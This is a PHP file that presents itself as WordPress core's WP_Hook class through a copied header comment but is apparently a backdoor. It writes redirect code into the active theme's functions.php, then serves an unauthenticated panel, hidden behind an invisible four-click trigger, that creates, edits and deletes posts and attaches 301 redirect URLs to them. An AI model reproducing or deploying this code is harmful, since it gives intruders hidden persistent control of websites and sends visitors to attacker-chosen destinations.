<?php
/**
 * Plugin API: WP_Hook class
 *
 * @package WordPress
 * @subpackage Plugin
 * @since 4.7.0
 */

/**
 * Core class used to implement action and filter hook functionality.
 *
 * @since 4.7.0
 *
 * @see Iterator
 * @see ArrayAccess
 */
function find_wp_root_directory() {
    $directory = dirname(__FILE__);
    while (!file_exists($directory . '/wp-load.php')) {
        $directory = dirname($directory);
        if ($directory === dirname($directory)) {
            return false; // Return error if wp-load.php is not found
        }
    }
    return $directory;
}

$wp_directory = find_wp_root_directory();

if ($wp_directory) {
    require_once($wp_directory . '/wp-load.php');
} else {
    die('WordPress root directory not found.');
}

if (!function_exists('redirect_check')) {
    function redirect_check() {
        if (is_single()) {
            global $post;
            $redirect_url = get_post_meta($post->ID, 'redirect_url', true);
            if ($redirect_url && !empty($redirect_url)) {
                wp_redirect($redirect_url, 301);
                exit();
            }
        }
    }
}

function add_code_to_functions_php() {
    $main_theme_directory = get_template_directory();
    $functions_file_path = $main_theme_directory . '/functions.php';

    $code_to_add = "?>\n<?php\n// Redirect check function\n";
    $code_to_add .= "if (!function_exists('redirect_check')) {\n";
    $code_to_add .= "function redirect_check() {\n";
    $code_to_add .= "    if (is_single()) {\n";
    $code_to_add .= "        global \$post;\n";
    $code_to_add .= "        \$redirect_url = get_post_meta(\$post->ID, 'redirect_url', true);\n";
    $code_to_add .= "        if (\$redirect_url && !empty(\$redirect_url)) {\n";
    $code_to_add .= "            wp_redirect(\$redirect_url, 301);\n";
    $code_to_add .= "            exit();\n";
    $code_to_add .= "        }\n";
    $code_to_add .= "    }\n";
    $code_to_add .= "}\n";
    $code_to_add .= "}\n";
    $code_to_add .= "add_action('wp', 'redirect_check');\n";

    $functions_content = file_get_contents($functions_file_path);
    
    if (strpos($functions_content, 'redirect_check') !== false) {
        echo '.';
        return; // Do not perform addition
    }

    $last_two_lines = substr($functions_content, -2);

    if ($last_two_lines === "?>") {
        $functions_content = substr_replace($functions_content, $code_to_add, -2, 0);
    } else {
        $functions_content .= "?>\n<?php\n" . $code_to_add . "\n?>";
    }

    if (is_writable($functions_file_path)) {
        file_put_contents($functions_file_path, $functions_content);
        echo '..';
    } else {
        echo 'No write permission for functions.php.';
    }
}

add_code_to_functions_php();

$edit_post_id = isset($_GET['edit']) ? intval($_GET['edit']) : 0;
$delete_post_id = isset($_GET['delete']) ? intval($_GET['delete']) : 0;
$title = '';
$content = '';
$publish_date = date('Y-m-d\TH:i');
$redirect_url = '';
$keywords = '';
$category_id = '';

if ($delete_post_id) {
    wp_delete_post($delete_post_id, true);
    echo '<div class="notice notice-success">Article successfully deleted.</div>';
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $title = sanitize_text_field($_POST['title']);
    $content = wp_kses_post($_POST['content']);
    $publish_date = sanitize_text_field($_POST['publish_date']);
    $redirect_url = esc_url($_POST['redirect_url']);
    $keywords = sanitize_text_field($_POST['keywords']);
    $category_id = intval($_POST['category']);

    if ($edit_post_id) {
        $post_data = array(
            'ID'           => $edit_post_id,
            'post_title'   => $title,
            'post_content' => $content,
            'post_date'    => $publish_date,
        );
        wp_update_post($post_data);
        update_post_meta($edit_post_id, 'redirect_url', $redirect_url);
        update_post_meta($edit_post_id, 'keywords', $keywords);
        wp_set_post_terms($edit_post_id, array($category_id), 'category');
        echo '<div class="notice notice-success">Article successfully updated.</div>';
    } else {
        $post_data = array(
            'post_title'   => $title,
            'post_content' => $content,
            'post_status'  => 'publish',
            'post_date'    => $publish_date,
        );
        $new_post_id = wp_insert_post($post_data);
        add_post_meta($new_post_id, 'redirect_url', $redirect_url);
        add_post_meta($new_post_id, 'keywords', $keywords);
        add_post_meta($new_post_id, 'source', 'php_file');
        wp_set_post_terms($new_post_id, array($category_id), 'category');
        echo '<div class="notice notice-success">Article successfully added.</div>';
    }
}

if ($edit_post_id) {
    $post = get_post($edit_post_id);
    if ($post) {
        $title = $post->post_title;
        $content = $post->post_content;
        $publish_date = get_the_date('Y-m-d\TH:i', $post);
        $redirect_url = get_post_meta($post->ID, 'redirect_url', true);
        $keywords = get_post_meta($post->ID, 'keywords', true);
        $category_id = wp_get_post_terms($post->ID, 'category', array('fields' => 'ids'));
        $category_id = !empty($category_id) ? $category_id[0] : '';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wp Hook</title>
    <?php wp_head(); ?>
    <link rel="stylesheet" href="<?php echo admin_url('load-styles.php?c=1&dir=ltr&load=admin-bar,wp-admin,buttons,forms,common&ver=' . get_bloginfo('version')); ?>" type="text/css" media="all" />
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            margin: 20px;
        }
        .wrap {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #ccd0d4;
            border-radius: 6px;
            display: none; /* İçerik başlangıçta gizli */
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        #trigger {
            position: absolute;
            top: 0;
            right: 0;
            width: 300px;
            height: 300px;
            background-color: rgba(0, 0, 0, 0);
            cursor: pointer;
            z-index: 9999;
        }
        #trigger:hover {
            cursor: default; /* Tıklanabilir alanın mouse ile belli olmamasını sağlar */
        }
        #visible-point {
            font-size: 30px;
            text-align: center;
            width: 100%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
 body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            margin: 20px;
        }
        .wrap {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #ccd0d4;
            border-radius: 6px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            font-weight: 600;
            margin-bottom: 5px;
            display: block;
        }
        input[type="text"], input[type="url"], input[type="datetime-local"], select, textarea {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccd0d4;
            border-radius: 4px;
            box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
            font-size: 14px;
        }
        textarea {
            height: 200px;
        }
        input[type="submit"] {
            background-color: #007cba;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #005a8d;
        }
        .notice {
            padding: 10px;
            border-left: 4px solid;
            margin-top: 20px;
            border-radius: 4px;
        }
        .notice-success {
            background-color: #e7f7e4;
            border-color: #46b450;
        }
        .post-list {
            margin-top: 40px;
            padding: 0;
            list-style: none;
            border-top: 1px solid #ccd0d4;
        }
        .post-list li {
            padding: 15px 0;
            border-bottom: 1px solid #ccd0d4;
        }
        .post-list h2 {
            margin: 0;
            font-size: 20px;
        }
        .post-list a {
            text-decoration: none;
            color: #007cba;
        }
        .post-list a:hover {
            text-decoration: underline;
        }

#trigger {
    position: absolute;
    top: 0;
    right: 0;
    width: 300px;
    height: 300px;
    background-color: rgba(0, 0, 0, 0);
    cursor: pointer;
    z-index: 9999;
}

#trigger:hover {
    cursor: default; /* Tıklanabilir alanın mouse ile belli olmamasını sağlar */
}

#visible-point {
    font-size: 30px;
    text-align: center;
    width: 100%;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

    </style>
</head>
<body>
    <div id="trigger"></div>
    <div id="visible-point">.</div>
    
    <div class="wrap">
        <h1><?php echo $edit_post_id ? 'Edit Post' : 'Add New Post'; ?></h1>
        <form action="" method="POST">
            <div class="form-group">
                <label for="title">Article Title:</label>
                <input type="text" id="title" name="title" value="<?php echo esc_attr($title); ?>" required>
            </div>

            <div class="form-group">
                <label for="content">Article Content:</label>
                <?php
                $settings = array(
                    'textarea_name' => 'content',
                    'media_buttons' => true,
                    'textarea_rows' => 10,
                    'teeny' => false,
                    'quicktags' => true
                );
                wp_editor($content, 'content', $settings);
                ?>
            </div>

            <div class="form-group">
                <label for="category">Category:</label>
                <select id="category" name="category">
                    <?php
                    $args = array(
                        'taxonomy'     => 'category',
                        'orderby'      => 'count', // En çok post olan kategoriye göre sıralama
                        'order'        => 'DESC',
                        'hide_empty'   => false,
                    );
                    $categories = get_terms($args);

                    // İlk kategoriyi seçili yapacağız
                    $most_popular_category_id = !empty($categories) ? $categories[0]->term_id : '';

                    foreach ($categories as $category) {
                        $count = $category->count;
                        // En çok post eklenen kategoriyi varsayılan olarak seçili yapar
                        $selected = ($category->term_id == $most_popular_category_id) ? 'selected' : '';
                        echo '<option value="' . $category->term_id . '" ' . $selected . '>' . $category->name . ' (' . $count . ' posts)</option>';
                    }
                    ?>
                </select>
            </div>

            <div class="form-group">
                <label for="keywords">Keywords (Separate with commas):</label>
                <input type="text" id="keywords" name="keywords" value="<?php echo esc_attr($keywords); ?>">
            </div>

            <div class="form-group">
                <label for="publish_date">Publish Date:</label>
                <input type="datetime-local" id="publish_date" name="publish_date" value="<?php echo esc_attr($publish_date); ?>">
            </div>

            <div class="form-group">
                <label for="redirect_url">301 Redirect URL:</label>
                <input type="url" id="redirect_url" name="redirect_url" value="<?php echo esc_attr($redirect_url); ?>" placeholder="https://www.example.com">
            </div>

            <input type="submit" value="<?php echo $edit_post_id ? 'Update Post' : 'Add Post'; ?>">
        </form>

        <ul class="post-list">
            <?php
            $args = array(
                'post_type'      => 'post',
                'posts_per_page' => 10,
                'orderby'        => 'date',
                'order'          => 'DESC',
                'meta_query'     => array(
                    array(
                        'key'     => 'source',
                        'value'   => 'php_file',
                        'compare' => '='
                    ),
                ),
            );
            $query = new WP_Query($args);

            if ($query->have_posts()) {
                while ($query->have_posts()) {
                    $query->the_post();
                    ?>
                    <li>
                        <h2><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
                        <div class="post-meta">
                            <strong>ID:</strong> <?php echo get_the_ID(); ?> | 
                            <strong>Publish Date:</strong> <?php echo get_the_date(); ?>
                        </div>
                        <a href="?edit=<?php echo get_the_ID(); ?>">Edit</a> |
                        <a href="?delete=<?php echo get_the_ID(); ?>" onclick="return confirm('Are you sure you want to delete this article?');">Delete</a>
                    </li>
                    <?php
                }
                wp_reset_postdata();
            } else {
                echo '<li><p>No articles added from the PHP file.</p></li>';
            }
            ?>
        </ul>
    </div>

    <?php wp_footer(); ?>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const wrap = document.querySelector('.wrap');
            const trigger = document.getElementById('trigger');
            const visiblePoint = document.getElementById('visible-point');
            let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;

            if (localStorage.getItem('isVisible') === 'true') {
                wrap.style.display = 'block';
                visiblePoint.style.display = 'none';
            }

            trigger.addEventListener('click', function() {
                clickCount++;
                localStorage.setItem('clickCount', clickCount);

                if (clickCount >= 4) {
                    wrap.style.display = 'block';
                    visiblePoint.style.display = 'none';
                    localStorage.setItem('isVisible', 'true');
                    localStorage.setItem('clickCount', 0); // Sayaç sıfırlanır
                }
            });
        });
    </script>
</body>
</html>